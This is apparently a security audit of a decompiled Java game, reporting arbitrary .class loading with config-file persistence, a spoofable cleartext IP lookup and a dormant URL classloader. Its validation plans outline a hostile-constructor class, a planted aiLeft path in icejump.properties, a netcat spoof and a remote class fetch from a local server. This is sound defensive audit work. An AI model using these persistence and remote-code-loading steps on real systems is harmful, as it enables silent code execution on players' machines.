findings.title: Arbitrary local .class loading via defineClass+newInstance, auto-restored from icejump.properties on every launch
findings.code_excerpt:
byte data[] = loadClassData(filename);
c = defineClass(data, 0, data.length);   // line 63
...
o = c.newInstance();                     // line 36, runs before instanceof check at line 37
findings.entry_point: (a) JFileChooser selection of any .class file: ApoIcejumpPanel.loadPlayer(int,String) at ApoIcejumpPanel.java:596-621. (b) Startup config restore: ApoIcejumpPanel.init() line 224 -> loadProperties() line 227 -> loadPropertiesPlayer() line 248 reads the 'aiLeft'/'aiRight' values that ApoIcejumpConstants.loadProperties() (ApoIcejumpConstants.java:44-62) loaded from CWD-relative 'icejump.properties' (name fixed at line 20).
findings.sink: defineClass(data,0,data.length) at ApoIcejumpClassLoader.java:63 followed by c.newInstance() at :36, reached from ApoIcejumpPanel.java:647 (new ApoIcejumpClassLoader(path, classname).getAI()).
findings.data_path: icejump.properties -> ApoIcejumpConstants.loadProperties() -> ApoIcejumpConstants.AI_LEFT/AI_RIGHT -> ApoIcejumpPanel.loadPropertiesPlayer() (non-numeric string) -> ApoIcejumpPanel.loadPlayer(player,s) parses '<dir>\<name>.class' -> loadPlayer(player,path,classname,'.class') -> guard '!ApoConstants.B_APPLET' (line 646) -> ApoIcejumpClassLoader.getAI() -> loadClass() -> loadClassData() reads raw bytes from disk -> defineClass -> newInstance(). Same sink from the chooser path via lines 602-607. Persisted because ApoIcejumpPanel.java:654-658 writes AI_LEFT=path+classname+classN then calls ApoIcejumpConstants.saveProperties() (ApoIcejumpConstants.java:26-42).
findings.attack_scenario: Scenario A (malicious shared AI): the game's public plugin API (apoIcejump/ai/ApoIcejumpAI.java:12 'class from which all ais have to extend') encourages players to exchange AI .class files. An attacker posts evil.class claiming to be a strong AI; victim loads it once via 'load player'; its constructor executes with full JVM privileges before the instanceof check at ApoIcejumpClassLoader.java:37, giving total control (no SecurityManager, no sandbox). Scenario B (persistence): malware or a co-located process drops evil.class anywhere writable and sets aiLeft=C:\path\evil.class in icejump.properties next to the game; every subsequent launch of ApoIcejumpMain silently defines and instantiates it at menu time with no user interaction.
findings.preconditions: Desktop mode (guard !ApoConstants.B_APPLET at ApoIcejumpPanel.java:646 excludes the applet build). Scenario A: user must select the attacker's .class in the file chooser (social engineering typical for a game that advertises community AIs). Scenario B: attacker needs write access to icejump.properties (CWD-relative) and to some .class path, plus a later game launch.
findings.validation_plan: 1) Compile a class extending apoIcejump.ai.ApoIcejumpAI whose no-arg constructor writes a marker file (or opens a socket) - do NOT implement think() correctly. 2) Run ApoIcejumpMain, click load-player, choose evil.class: constructor fires although the object fails the instanceof check afterwards, proving pre-cast execution. 3) Quit, hand-edit icejump.properties to aiLeft=<abs path>\evil.class (Windows separators, matching the '\' parsing at ApoIcejumpPanel.java:617-618), relaunch: marker appears at main-menu render time with zero clicks, proving config-driven auto-execution. 4) Repeat with B_APPLET=true to confirm the applet build refuses local loading (line 646).

findings.title: Cleartext HTTP lookup of public IP on network screen; response rendered to user
findings.entry_point: User opens the Network menu: ApoIcejumpPanel.setNetwork(boolean) (ApoIcejumpPanel.java:720-725) -> ApoIcejumpNetwork.start(boolean) spawns a thread (lines 60-61) -> run() (163-166) -> getRouterIP().
findings.sink: url.openStream() at ApoIcejumpNetwork.java:69 - plaintext HTTP GET; first response line becomes 'router IP: '+line (line 85) and is drawn on screen by renderNetwork() (lines 242-244). Local interface address also shown via getLocalIP() (lines 90-99).
findings.data_path: menu button/key ('N', ApoIcejumpMenu.java:144-145) -> setNetwork -> start -> Thread -> getRouterIP -> URL.openStream over http:// -> BufferedReader.readLine -> myRouterIP field -> drawString in renderNetwork.
findings.attack_scenario: Any on-path attacker (open Wi-Fi, ISP, DNS hijack of whatismyip.com) sees the player's IP being queried in cleartext and can return an arbitrary single-line string, which the client displays verbatim as 'router IP: ...' inside the network-play dialog - e.g. injecting a fake 'connect to <attacker-ip>' style message for social engineering of the P2P handshake the screen exists to support. Player's public IP is simultaneously disclosed to a third-party site over port 80.
findings.preconditions: Victim opens the Network menu while online; attacker positioned on-path or controlling DNS for whatismyip.com. Note: the automation endpoint is long dead (returns HTML/ad text today), so the displayed line is already garbage in practice - the request still fires and is still spoofable.
findings.validation_plan: 1) tcpdump/Wireshark while pressing N in-game: observe cleartext 'GET /automation/n09230945.asp Host: whatismyip.com'. 2) Redirect whatismyip.com locally (/etc/hosts + netcat serving one line 'PWNED-IP') and reopen the screen: 'router IP: PWNED-IP' renders in the dialog, confirming server-controlled display text.

findings.title: Shared URLClassLoader helper able to instantiate code from any URL - present but uncalled (dormant clone infra)
findings.entry_point: None in this variant: grep over all 76 files finds getMyClass()/new ApoClassLoader( only at its definition (this file, lines 19 and 62). In sibling variants the same helper is wired to AI/level loading.
findings.sink: URLClassLoader construction over a caller-supplied File path or, in applet mode (line 68), over an arbitrary URL string, then Class.newInstance() at line 75 - i.e. remote classloading from any http:// location if ever called with attacker-controlled arguments.
findings.data_path: Currently unreachable: no call sites exist in this variant. The class survives as cloned org.apogames infrastructure alongside ApoIO (whose applet-only HttpURLConnection upload at ApoIO.java:167-170 and openStream() downloads at :144-145/:221-222 are likewise subclass-less and dead here; the matching endpoint constant APPLET_LEVEL='http://apo-games.de/apoIcejumpReloaded/' at ApoIcejumpComponent.java:26 is never referenced).
findings.attack_scenario: Theoretical: if a future maintainer re-wires AI or level loading through ApoClassLoader.getMyClass() (as sibling variants do), any http(s) URL passed in applet mode yields silent remote code execution from that host; a network attacker could then serve hostile class bytes. As shipped, an attacker gains nothing from this file.
findings.preconditions: Requires new call-site code passing an attacker-influenced path/URL; cannot be triggered against the shipped variant.
findings.validation_plan: Reproduce the absence: run an IDE call-hierarchy search for getMyClass() in this source root (returns only the declaration). Reproduce the capability: add a temporary main() calling new ApoClassLoader("http://127.0.0.1:8000/","Evil").getMyClass() with a class file served by python -m http.server and observe instantiation - demonstrating what one-line reuse in any sibling variant activates.

categories_checked_and_absent: untrusted_deserialization - no java.io.ObjectInputStream/readObject anywhere in the tree (grep over all 76 files)
unsafe_native_call - no System.load, Runtime.getRuntime(), ProcessBuilder or *exec()* calls
weak_integrity_check - no MessageDigest/MD5/hash usage at all; no highscore or checksum validation logic exists
credential_or_secret_exposure - no credentials, tokens or secrets embedded; icejump.properties only holds FPS and AI path strings

unsafe_custom_parser - no custom binary/text save, level or replay formats in this variant: ApoIcejumpPanel.loadLevel/saveLevel (lines 821-827) are empty stubs, no .cheat/.mar/.skunk/.defence/.rep handling exists, and nothing subclasses org.apogames.ApoIO, so its DataInputStream parsers are uninstantiable dead code

plain-HTTP score/level submission to apo-games.de (save_highscore.php/save_level.php/get_level.php) - not present; APPLET_LEVEL constant is unused and no HTTP write path is reachable (see ApoIcejump-03)

path_traversal - no attacker-controlled path reaches file writes; the only variable path read is an AI-supplied image string (ApoIcejumpPlayer.java:126, System.getProperty("user.dir")+File.separator+imageString into ImageIO.read), but its source is already-arbitrary plugin code, so it crosses no trust boundary
resource_exhaustion - simulation loop (ApoIcejumpSimulation.java:75-111) is bounded by a user-set game count and purely local
notes: Source is a decompiled-JAR snapshot under _from_jar_ApoIcejumpReloaded/ (76 files): org.apogames* is the shared corpus framework, apoIcejump* is game code. This is the lightest attack surface in the corpus so far: no server communication beyond the whatismyip lookup, no persistence format, no deserialization, no natives. The dominant risk is the by-design AI-plugin mechanism (ApoIcejumpClassLoader), which is intentionally unsandboxed - fine for 2007 applet-era assumptions, notable now because (1) newInstance() executes hostile constructors before the instanceof filter, and (2) the chosen AI path is persisted in CWD-relative icejump.properties (not user.home) and silently re-executed at every startup, making the config file a code-execution persistence point; note the restore path parses Windows backslashes only (ApoIcejumpPanel.java:617-618), yet still functions on POSIX because new File("", "/abs/name.class") discards the empty parent. ApoIcejumpClassLoader is byte-for-byte the same loader pattern (root dir + name + defineClass) expected in sibling variants under game-specific names, hence shared_component=true; ApoIcejumpNetwork and the properties handler are likewise template-cloned across the family even though the game logic differs. Applet mode (ApoIcejumpApplet/ApoApplet set B_APPLET=true) disables local classloading, file choosers, and properties I/O, so findings 01/02 apply to the desktop build.
